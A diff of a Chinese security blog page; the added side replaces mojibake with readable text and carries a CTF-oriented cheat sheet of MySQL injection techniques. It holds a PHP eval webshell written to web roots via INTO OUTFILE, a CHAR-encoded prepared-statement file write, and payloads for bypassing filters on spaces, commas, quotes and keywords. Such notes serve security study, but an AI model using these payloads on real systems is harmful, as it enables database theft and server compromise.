@@ -17,19 +17,19 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>mysql��ע�뼼�� | ZenisLTZ&#39;s Blog</title>
-  <meta name="description" content="mysql��ע�뼼��ע�뷽ʽһ�¸���ǲ��еģ�ֻ�Ǿٳ�һЩ�����Ľз�  insert/update/deleteע��(äע) md5���ܺ�ע�� ���ֽ�ע�� ����ע�� UDF�빥���洢����[^1] OOB(����ע��) falseע��  Techniqueд��shell Mysqlע���е�outfile��dumpfile��load_fil">
+  <title>mysql的注入技巧 | ZenisLTZ&#39;s Blog</title>
+  <meta name="description" content="mysql的注入技巧注入方式一下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
 <meta name="keywords" content="mysql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mysql��ע�뼼��">
+<meta property="og:title" content="mysql的注入技巧">
 <meta property="og:url" content="http://ZenisLTZ.github.io/2018/10/21/sqltec_mysql/index.html">
 <meta property="og:site_name" content="ZenisLTZ">
-<meta property="og:description" content="mysql��ע�뼼��ע�뷽ʽһ�¸���ǲ��еģ�ֻ�Ǿٳ�һЩ�����Ľз�  insert/update/deleteע��(äע) md5���ܺ�ע�� ���ֽ�ע�� ����ע�� UDF�빥���洢����[^1] OOB(����ע��) falseע��  Techniqueд��shell Mysqlע���е�outfile��dumpfile��load_fil">
+<meta property="og:description" content="mysql的注入技巧注入方式一下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-20T17:48:19.379Z">
+<meta property="og:updated_time" content="2018-10-20T18:25:53.733Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mysql��ע�뼼��">
-<meta name="twitter:description" content="mysql��ע�뼼��ע�뷽ʽһ�¸���ǲ��еģ�ֻ�Ǿٳ�һЩ�����Ľз�  insert/update/deleteע��(äע) md5���ܺ�ע�� ���ֽ�ע�� ����ע�� UDF�빥���洢����[^1] OOB(����ע��) falseע��  Techniqueд��shell Mysqlע���е�outfile��dumpfile��load_fil">
+<meta name="twitter:title" content="mysql的注入技巧">
+<meta name="twitter:description" content="mysql的注入技巧注入方式一下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
   <!-- Canonical links -->
   <link rel="canonical" href="http://ZenisLTZ.github.io/2018/10/21/sqltec_mysql/index.html">
   
@@ -267,7 +267,7 @@
                 
               </p>
               <p class="item-title">
-                <a href="/2018/10/21/sqltec_mysql/" class="title">mysql��ע�뼼��</a>
+                <a href="/2018/10/21/sqltec_mysql/" class="title">mysql的注入技巧</a>
               </p>
               <p class="item-date">
                 <time datetime="2018-10-20T17:46:50.115Z" itemprop="datePublished">2018-10-21</time>
@@ -325,7 +325,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      mysql��ע�뼼��
+      mysql的注入技巧
     </h1>
   
 
@@ -353,127 +353,127 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="mysql��ע�뼼��"><a href="#mysql��ע�뼼��" class="headerlink" title="mysql��ע�뼼��"></a>mysql��ע�뼼��</h1><h2 id="ע�뷽ʽ"><a href="#ע�뷽ʽ" class="headerlink" title="ע�뷽ʽ"></a>ע�뷽ʽ</h2><p>һ�¸���ǲ��еģ�ֻ�Ǿٳ�һЩ�����Ľз�</p>
+        <h1 id="mysql的注入技巧"><a href="#mysql的注入技巧" class="headerlink" title="mysql的注入技巧"></a>mysql的注入技巧</h1><h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><p>一下概念并非并列的，只是举出一些常见的叫法</p>
 <ul>
-<li>insert/update/deleteע��(äע)</li>
-<li>md5���ܺ�ע��</li>
-<li>���ֽ�ע��</li>
-<li>����ע��</li>
-<li>UDF�빥���洢����[^1]</li>
-<li>OOB(����ע��)</li>
-<li>falseע��</li>
+<li>insert/update/delete注入(盲注)</li>
+<li>md5加密后注入</li>
+<li>宽字节注入</li>
+<li>报错注入</li>
+<li>UDF与攻击存储类似[^1]</li>
+<li>OOB(带外注入)</li>
+<li>false注入</li>
 </ul>
-<h2 id="Technique"><a href="#Technique" class="headerlink" title="Technique"></a>Technique</h2><h3 id="д��shell"><a href="#д��shell" class="headerlink" title="д��shell"></a>д��shell</h3><p><a href="https://www.jb51.net/article/139858.htm" target="_blank" rel="noopener"> Mysqlע���е�outfile��dumpfile��load_file�������</a></p>
+<h2 id="Technique"><a href="#Technique" class="headerlink" title="Technique"></a>Technique</h2><h3 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h3><p><a href="https://www.jb51.net/article/139858.htm" target="_blank" rel="noopener"> Mysql注入中的outfile、dumpfile、load_file函数详解</a></p>
 <ul>
 <li><p>secure_file_priv </p>
-<p>����ͨ������?<code>select @@secure_file_priv</code> </p>
+<p>可以通过命令?<code>select @@secure_file_priv</code> </p>
 <ul>
-<li>Ϊ��ʱ���Ե��뵼�������� </li>
-<li>��ֵΪһ��ָ����Ŀ¼ʱ��ֻ����ָ����Ŀ¼���뵼��</li>
-<li>��ֵ������ΪNULLʱ����ֹ���뵼������</li>
+<li>为空时，对导入导出无限制 </li>
+<li>当值为一个指定的目录时，只能向指定的目录导入导出</li>
+<li>当值被设置为NULL时，禁止导入导出功能</li>
 </ul>
 </li>
 </ul>
-<p>��<code>select into outfile</code>��<code>select  into dumpfile</code>(�����ڶ������ļ����ὫĿ���ļ�д��ͬһ����)<br>PS:д���ļ��Ĳ���Ҫ��Ŀ¼��д </p>
-<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,��&lt;?php eval($_POST[cmd]);?&gt;�� INTO OUTFILE ��/var/www/dvwa/cmd.php�� +- -+</span><br><span class="line">select 1,��&lt;?php eval($_POST[cmd]);?&gt;�� into outfile ��c:\\2.php��+- -+</span><br></pre></td></tr></table></figure></p>
-<h3 id="column-truncation"><a href="#column-truncation" class="headerlink" title="column truncation"></a>column truncation</h3><p>sql_mode������Ϊdefault��û�п���STRICT_ALL_TABLEѡ��ʱ������Ҳ����������</p>
+<p>用<code>select into outfile</code>或<code>select  into dumpfile</code>(适用于二进制文件，会将目标文件写入同一行内)<br>PS:写入文件的操作要求目录可写 </p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,’&lt;?php eval($_POST[cmd]);?&gt;‘ INTO OUTFILE ‘/var/www/dvwa/cmd.php’ +- -+</span><br><span class="line">select 1,’&lt;?php eval($_POST[cmd]);?&gt;’ into outfile ‘c:\\2.php’+- -+</span><br></pre></td></tr></table></figure></p>
+<h3 id="column-truncation"><a href="#column-truncation" class="headerlink" title="column truncation"></a>column truncation</h3><p>sql_mode中设置为default或没有开启STRICT_ALL_TABLE选项时，超长也会正常插入</p>
 <ul>
 <li>WordPress 2.6.1</li>
-<li>NJCTF 2017 web100 Login<br>–�������Ҷ�㼸����Ȼע��ɹ�����Ϊ�û��������ظ��ģ������뵽�����г������������·�����50�����������Ϳ�����취����admin�����롱  </li>
+<li>NJCTF 2017 web100 Login<br>–“而且我多点几次任然注册成功，因为用户名不能重复的，所以想到这里有长度限制试了下发现是50，所以这样就可以想办法重置admin的密码”  </li>
 </ul>
-<h3 id="δ֪�ֶ���ע������"><a href="#δ֪�ֶ���ע������" class="headerlink" title="δ֪�ֶ���ע������"></a>δ֪�ֶ���ע������</h3><ul>
-<li><a href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/" target="_blank" rel="noopener">Mysql��ô������ƹ�δ֪�ֶ���</a></li>
+<h3 id="未知字段名注出内容"><a href="#未知字段名注出内容" class="headerlink" title="未知字段名注出内容"></a>未知字段名注出内容</h3><ul>
+<li><a href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/" target="_blank" rel="noopener">Mysql怎么巧妙的绕过未知字段名</a></li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e limit 1 offset 3;  </span><br><span class="line">&gt;select * from user where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;  	</span><br><span class="line">&gt;select name from test where id=1 and (select * from (select * from test as a join test as b) as c);</span><br></pre></td></tr></table></figure>
-<h4 id="DDCTF2017-SQL"><a href="#DDCTF2017-SQL" class="headerlink" title="DDCTF2017 SQL"></a>DDCTF2017 SQL</h4><h3 id="δ֪����aע"><a href="#δ֪����aע" class="headerlink" title="δ֪����äע"></a>δ֪����äע</h3><ul>
-<li><a href="http://wonderkun.cc/index.html/?p=547" target="_blank" rel="noopener">orderby�ޱ���ע�� </a></li>
+<h4 id="DDCTF2017-SQL"><a href="#DDCTF2017-SQL" class="headerlink" title="DDCTF2017 SQL"></a>DDCTF2017 SQL</h4><h3 id="未知表名盲注"><a href="#未知表名盲注" class="headerlink" title="未知表名盲注"></a>未知表名盲注</h3><ul>
+<li><a href="http://wonderkun.cc/index.html/?p=547" target="_blank" rel="noopener">orderby无表名注入 </a></li>
 </ul>
-<p>δ֪�ֶ�������ȷ��sql�Ĳ�ѯ�������ں�̨�Ĳ����з���(��php)���ֶε�ֵ</p>
-<p>äעĳ����¼��һ���ֶε�ֵ��union����һ��������order byָ����ֶΣ���С����ֱ������</p>
-<p>����order byĬ��ascii��������ԣ�äע���ֶ�ֵ</p>
-<h4 id="HBCTF-ɳ�ذ�����-��������-Wonderkun"><a href="#HBCTF-ɳ�ذ�����-��������-Wonderkun" class="headerlink" title="HBCTF    ɳ�ذ�����-��������         Wonderkun"></a>HBCTF    ɳ�ذ�����-��������         Wonderkun</h4><p><a href="https://blog.csdn.net/xyz123lc/article/details/71429734" target="_blank" rel="noopener">https://blog.csdn.net/xyz123lc/article/details/71429734</a></p>
-<h4 id="LCTF2017-������ʲo������"><a href="#LCTF2017-������ʲo������" class="headerlink" title="LCTF2017 ������ʲô������"></a>LCTF2017 ������ʲô������</h4><p>Ҫ��õ������ڵ��ĸ�</p>
+<p>未知字段名，但确定sql的查询操作能在后台的操作中返回(到php)该字段的值</p>
+<p>盲注某个记录的一个字段的值，union另外一个，并将order by指向该字段，从小到大，直到报错，</p>
+<p>利用order by默认ascii排序的特性，盲注出字段值</p>
+<h4 id="HBCTF-沙特阿拉伯-大美西安-Wonderkun"><a href="#HBCTF-沙特阿拉伯-大美西安-Wonderkun" class="headerlink" title="HBCTF    沙特阿拉伯-大美西安         Wonderkun"></a>HBCTF    沙特阿拉伯-大美西安         Wonderkun</h4><p><a href="https://blog.csdn.net/xyz123lc/article/details/71429734" target="_blank" rel="noopener">https://blog.csdn.net/xyz123lc/article/details/71429734</a></p>
+<h4 id="LCTF2017-他们有什么秘密呢"><a href="#LCTF2017-他们有什么秘密呢" class="headerlink" title="LCTF2017 他们有什么秘密呢"></a>LCTF2017 他们有什么秘密呢</h4><p>要获得的数据在第四个</p>
 <p><a href="https://www.cnblogs.com/ur10ser/p/7875473.html" target="_blank" rel="noopener">https://www.cnblogs.com/ur10ser/p/7875473.html</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;3 union distinct select 1,2,3,&#123;&#125;  order by 4 desc&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="�����ƹ�"><a href="#�����ƹ�" class="headerlink" title="�����ƹ�"></a>�����ƹ�</h2><h3 id="PREPARE���"><a href="#PREPARE���" class="headerlink" title="PREPARE���"></a>PREPARE���</h3><p>�����������ִ�еĳ���(mysqli_multi_query)�������ƹ��������ˣ�������XSS�е�String.fromCharCode()  </p>
+<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><h3 id="PREPARE语句"><a href="#PREPARE语句" class="headerlink" title="PREPARE语句"></a>PREPARE语句</h3><p>在能连续多次执行的场合(mysqli_multi_query)，可以绕过常见过滤，类似于XSS中的String.fromCharCode()  </p>
 <ul>
 <li>SUCTF 2018 MultiSql</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(39),CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(112),CHAR(104),CHAR(112),CHAR(105),CHAR(110),CHAR(102),CHAR(111),CHAR(40),CHAR(41),CHAR(59),CHAR(63),CHAR(62),CHAR(39),CHAR(32),CHAR(105),CHAR(110),CHAR(116),CHAR(111),CHAR(32),CHAR(111),CHAR(117),CHAR(116),CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(32),CHAR(39),CHAR(47),CHAR(118),CHAR(97),CHAR(114),CHAR(47),CHAR(119),CHAR(119),CHAR(119),CHAR(47),CHAR(104),CHAR(116),CHAR(109),CHAR(108),CHAR(47),CHAR(102),CHAR(97),CHAR(118),CHAR(105),CHAR(99),CHAR(111),CHAR(110),CHAR(47),CHAR(49),CHAR(46),CHAR(112),CHAR(104),CHAR(112),CHAR(39),CHAR(59));</span><br><span class="line">PREPARE s2 FROM @s;</span><br><span class="line">EXECUTE s2;</span><br></pre></td></tr></table></figure>
-<h3 id="�ƹ��ո�"><a href="#�ƹ��ո�" class="headerlink" title="�ƹ��ո�"></a>�ƹ��ո�</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</span><br></pre></td></tr></table></figure>
+<h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</span><br></pre></td></tr></table></figure>
 <ul>
-<li>������<br>id=8E0union<br>id=8.0</li>
-<li>����<br>  select(user())from</li>
+<li>浮点数<br>id=8E0union<br>id=8.0</li>
+<li>括号<br>  select(user())from</li>
 </ul>
-<h3 id="���ں��ƹ�"><a href="#���ں��ƹ�" class="headerlink" title="���ں��ƹ�"></a>���ں��ƹ�</h3><ul>
+<h3 id="等于号绕过"><a href="#等于号绕过" class="headerlink" title="等于号绕过"></a>等于号绕过</h3><ul>
 <li>in</li>
 <li>like</li>
 <li>having</li>
 <li>regexp</li>
 </ul>
-<h4 id="һЩp���ຯ��"><a href="#һЩp���ຯ��" class="headerlink" title="һЩƥ���ຯ��"></a>һЩƥ���ຯ��</h4><p>instr</p>
+<h4 id="一些匹配类函数"><a href="#一些匹配类函数" class="headerlink" title="一些匹配类函数"></a>一些匹配类函数</h4><p>instr</p>
 <p>locate</p>
 <p>position</p>
-<h3 id="if�ƹ�"><a href="#if�ƹ�" class="headerlink" title="if�ƹ�"></a>if�ƹ�</h3><ul>
-<li>IFNULL(expr1,expr2)<br>����expr1 ��Ϊ NULL���� IFNULL() �ķ���ֵΪ expr1; �����䷵��ֵΪ expr2��<br>   case when [] then [] else []    </li>
+<h3 id="if绕过"><a href="#if绕过" class="headerlink" title="if绕过"></a>if绕过</h3><ul>
+<li>IFNULL(expr1,expr2)<br>假如expr1 不为 NULL，则 IFNULL() 的返回值为 expr1; 否则其返回值为 expr2。<br>   case when [] then [] else []    </li>
 </ul>
-<h3 id="�����ƹ�-1"><a href="#�����ƹ�-1" class="headerlink" title="�����ƹ�"></a>�����ƹ�</h3><ul>
-<li><p>substr(),mid(),limit��<br>��Щ�Ӿ䷽������Ҫʹ�õ����š�<br>����substr()��mid()��������������ʹ��from for���涺��</p>
-<p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);<br>select mid((passwd)from(-1)); //�ƹ����źͿո�,���ҴӺ���ǰ���Ժ��Գ���</p>
+<h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><ul>
+<li><p>substr(),mid(),limit。<br>这些子句方法都需要使用到逗号。<br>对于substr()和mid()这两个方法可以使用from for代替逗号</p>
+<p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);<br>select mid((passwd)from(-1)); //绕过逗号和空格,而且从后往前可以忽略长度</p>
 </li>
-<li><p>ʹ��join��  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #�ȼ���  </span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
+<li><p>使用join：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于  </span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>ʹ��like��</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #�ȼ���</span><br><span class="line">select user() like &apos;r%&apos;</span><br></pre></td></tr></table></figure>
+<li><p>使用like：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &apos;r%&apos;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>limit�еĶ��ſ���ʹ��offset���ƹ���<br>select <em> from news limit 0,1<br>�ȼ�����������SQL���<br>select </em> from news limit 1 offset 0</p>
+<li><p>limit中的逗号可以使用offset来绕过：<br>select <em> from news limit 0,1<br>等价于下面这条SQL语句<br>select </em> from news limit 1 offset 0</p>
 </li>
 </ul>
-<h3 id="����С�ں��ƹ�"><a href="#����С�ں��ƹ�" class="headerlink" title="����С�ں��ƹ�"></a>����С�ں��ƹ�</h3><ul>
-<li><p>greatest()��least()  </p>
+<h3 id="大于小于号绕过"><a href="#大于小于号绕过" class="headerlink" title="大于小于号绕过"></a>大于小于号绕过</h3><ul>
+<li><p>greatest()、least()  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>ʹ��between and��<br> between a and b������a��b֮������ݣ�������b��</p>
+<li><p>使用between and：<br> between a and b：返回a，b之间的数据，不包含b。</p>
 </li>
 </ul>
-<h3 id="�߼������"><a href="#�߼������" class="headerlink" title="�߼������"></a>�߼������</h3><pre><code>��    ��NOT����!��
-��    ��AND����&amp;&amp;��
-��    ��OR����||��
-���    ��XOR��
-</code></pre><h3 id="λ����"><a href="#λ����" class="headerlink" title="λ����"></a>λ����</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">λ�루&amp;����λ��|����λ�ǣ�~����λ���^�������ƣ�&lt;&lt;��������(&gt;&gt;)</span><br><span class="line"></span><br><span class="line">������ʹ�ַ�������Ϊ0 // &apos;admin&apos;=&apos;a&apos;^0  Ϊ��</span><br></pre></td></tr></table></figure>
-<h3 id="�ؼ��ֹ���"><a href="#�ؼ��ֹ���" class="headerlink" title="�ؼ��ֹ���"></a>�ؼ��ֹ���</h3><p>�ƹ�union��select��where��</p>
+<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><pre><code>非    （NOT或者!）
+与    （AND或者&amp;&amp;）
+或    （OR或者||）
+异或    （XOR）
+</code></pre><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">位与（&amp;）、位或（|）、位非（~）、位异或（^）、左移（&lt;&lt;）、右移(&gt;&gt;)</span><br><span class="line"></span><br><span class="line">！异或会使字符串都变为0 // &apos;admin&apos;=&apos;a&apos;^0  为真</span><br></pre></td></tr></table></figure>
+<h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>绕过union，select，where等</p>
 <ul>
-<li>����ע�ͷ���</li>
+<li>常用注释符：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//��-- , /**/, #, --+, -- -, ;,%00,--a</span><br><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user��pwd from user</span><br><span class="line"></span><br><span class="line">id=-1&apos;UnIoN/**/SeLeCT</span><br><span class="line">id=-1&apos;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br><span class="line">or 1=1��%6f%72%20%31%3d%31����TestҲ����ΪCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)��</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br><span class="line"></span><br><span class="line">id=-1&apos;UnIoN/**/SeLeCT</span><br><span class="line">id=-1&apos;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br><span class="line">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>����%00</p>
-<p><code>se%00lect</code>%00��mysql�в��ᱻִ��</p>
+<li><p>插入%00</p>
+<p><code>se%00lect</code>%00在mysql中不会被执行</p>
 </li>
-<li><p>����%</p>
+<li><p>插入%</p>
 </li>
 </ul>
-<h3 id="�����ƹ�-2"><a href="#�����ƹ�-2" class="headerlink" title="�����ƹ�"></a>�����ƹ�</h3><ul>
-<li>ʮ������</li>
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><ul>
+<li>十六进制</li>
 <li>concat(char(),char(),…)</li>
-<li>Ԥ������� set @var=””  prepare</li>
-<li>���ֽ�ע��</li>
-<li>����ע��</li>
-<li>��ʽ���ַ���  (snprintf)<ul>
+<li>预处理语句 set @var=””  prepare</li>
+<li>宽字节注入</li>
+<li>二次注入</li>
+<li>格式化字符串  (snprintf)<ul>
 <li>LCTF2017 simple blog</li>
 </ul>
 </li>
 </ul>
 <h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><ul>
-<li>rpadlpad,left,right,mid���substr </li>
-<li>reverse��insert</li>
+<li>rpadlpad,left,right,mid替代substr </li>
+<li>reverse，insert</li>
 </ul>
-<p>lpad,rpad�����������</p>
+<p>lpad,rpad函数用于填充</p>
 <p>lpad(‘hi’,4,’?’) = ‘??hi’</p>
 <p>rpad(‘hi’,4,’?’) = ‘hi??’</p>
-<h2 id="�ο�����"><a href="#�ο�����" class="headerlink" title="�ο�����"></a>�ο�����</h2><p><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">sql_injection</a><br><a href="http://www.cnblogs.com/0201zcr/p/5296843.html" target="_blank" rel="noopener">mysql ���ݿ�����</a></p>
-<p>[^1]: �⺲�� ����ñ�ӽ�Web��ȫ��</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">sql_injection</a><br><a href="http://www.cnblogs.com/0201zcr/p/5296843.html" target="_blank" rel="noopener">mysql 数据库引擎</a></p>
+<p>[^1]: 吴翰清 《白帽子讲Web安全》</p>
 
       
     </div>
@@ -483,7 +483,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://ZenisLTZ.github.io/2018/10/21/sqltec_mysql/" title="mysql��ע�뼼��" target="_blank" rel="external">http://ZenisLTZ.github.io/2018/10/21/sqltec_mysql/</a>
+      <a href="http://ZenisLTZ.github.io/2018/10/21/sqltec_mysql/" title="mysql的注入技巧" target="_blank" rel="external">http://ZenisLTZ.github.io/2018/10/21/sqltec_mysql/</a>
     </li>
     
     <li class="post-copyright-license">
